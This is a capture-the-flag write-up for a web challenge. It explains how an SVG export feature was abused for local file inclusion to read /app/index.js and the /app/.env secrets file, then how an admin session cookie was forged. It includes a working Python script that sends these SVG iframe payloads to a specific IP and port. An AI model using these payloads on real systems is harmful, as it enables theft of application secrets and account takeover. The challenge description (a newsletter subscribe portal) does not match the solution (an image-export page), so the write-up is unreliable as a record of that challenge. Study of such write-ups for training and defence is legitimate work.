



## Intergalactic Post



## Challenge Author(s):

Ulysses

## Description:

`
The biggest intergalactic newsletter agency has constantly been spreading misinformation about the energy crisis war. Bonnie's sources confirmed a hostile takeover of the agency took place a few months back, and we suspect the Golden Fang army is behind this. Ulysses found us a potential access point to their agency servers. Can you hack their newsletter subscribe portal and get us entry?`

## Target: docker ip on demand

## Difficulty/Points: 300/easy

## Flag: HTB{inj3ct3d_th3_tru7h}

## Challenge

The challenge is presented with a login form and a registration form. We can easily register on the site and gain access to a page that handles images. We can upload images and get a result. At the bottom, an important piece of information is revealed, namely that if we log in as admin then we can see secret content.

# Solution 

I adopted a black box strategy, i.e. without having the slightest knowledge of the source of the application, I studied all the inputs they could give me. A web page can have several inputs (in the url, in the forms, in the headers, in the cookies) and I was mainly interested in the login and registration forms. I tried all combinations progressing towards increasingly targeted SQLi and XSS attacks without success. After a number of consistent payloads that I sent, I realised that this was not where the problem lay. I was left with the url (which in this case did not have any special get parameters and had no other directories to show using e.g. wfuzz which among other things was a forbidden tool by the rules so I always recommend reading the rules of each CTF), the cookie and the headers (they too in this case were not very relevant). I focus on the cookie and notice that the cookie's form was of the type session=base64 and this makes me think I have to decode it and in fact it returns something like {"username": "giovixo97"} . There were 2 cookies and 1 of them in particular made me think of a signature. My goal might be to steal the admin cookie, but there's a problem: what key do I use to encrypt the cookie? This question will be answered immediately. Going into the details of the web application we notice that intercepting with burp the export request made with the image form the post contains a paylaod referring to svg images. Recognising this type of image then I try to look for something malicious to use. With svg various paylaods can be found on the web and among those that work is the one that allows LFI. after obtaining LFI I read the server backend a bit. Unfortunately here you have to do a bit of guessing and figure out which folders to use. If it is docker (as hack the box points out when he creates the challenge) then usually the web apps are placed in the /app folder and the main file usually has the name index.js. So ultimately by reading /app/index.js we see the backend. Unfortunately if this assumption failed, I had no other ideas to go on, so I would have to somehow brute force the application by trying to figure out the directory structure. From the backend I realise that a special file is used, namely .env. This file is special because it will probably contain a <key,value> pair of something and in fact we find the admin's session key with which he encrypts his cookies. Having done this, it is enough to forge a cookie of the admin and access the web page. Below is the solving script.

```python
import requests
#stage 1: evil-svg LFI for index.js
burp0_url = "http://68.183.37.6:31002/api/export"
burp0_cookies = {"session": "eyJ1c2VybmFtZSI6ImEifQ==", "session.sig": "bfhobceQoICdOwlLNnmjJYUyB3s"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", "Accept": "*/*", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "http://68.183.37.6:31002/dashboard", "Content-Type": "application/json", "Origin": "http://68.183.37.6:31002", "DNT": "1", "Connection": "close"}
burp0_json={"svg": "<svg-dummy></svg-dummy> <iframe src='file:///app/index.js' width='100%' height='1000px'></iframe> <svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
#stage 2: evil-svg LFI for index.js displayed
burp0_url = "http://68.183.37.6:31002/exports/12e970eb82d261f08c4b8a9a2e2dc083.png"
burp0_cookies = {"session": "eyJ1c2VybmFtZSI6ImEifQ==", "session.sig": "bfhobceQoICdOwlLNnmjJYUyB3s"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", "Accept": "image/avif,image/webp,*/*", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": "http://68.183.37.6:31002/exports/5d53fa46b06017fd4ef46982dfb6d323.png"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
#stage 1: evil-svg LFI for .env
burp0_url = "http://68.183.37.6:31002/api/export"
burp0_cookies = {"session": "eyJ1c2VybmFtZSI6ImEifQ==", "session.sig": "bfhobceQoICdOwlLNnmjJYUyB3s"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", "Accept": "*/*", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Referer": "http://68.183.37.6:31002/dashboard", "Content-Type": "application/json", "Origin": "http://68.183.37.6:31002", "DNT": "1", "Connection": "close"}
burp0_json={"svg": "<svg-dummy></svg-dummy> <iframe src='file:///app/.env' width='100%' height='1000px'></iframe> <svg viewBox='0 0 240 80' height='1000' width='1000' xmlns='http://www.w3.org/2000/svg'><text x='0' y='0' class='Rrrrr' id='demo'>data</text></svg>"}
requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
#stage 1: evil-svg LFI for .env displayed
burp0_url = "http://68.183.37.6:31002/exports/6a9025bd866699d24a2c9cf9a4e36273.png"
burp0_cookies = {"session": "eyJ1c2VybmFtZSI6ImEifQ==", "session.sig": "bfhobceQoICdOwlLNnmjJYUyB3s"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0", "Accept": "image/avif,image/webp,*/*", "Accept-Language": "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "DNT": "1", "Connection": "close", "Referer": "http://68.183.37.6:31002/exports/5d53fa46b06017fd4ef46982dfb6d323.png"}
requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
```

the thing to do after this script is to view the cookie obtained from the png and set the cookie to see the flag in the site's home logged in as admin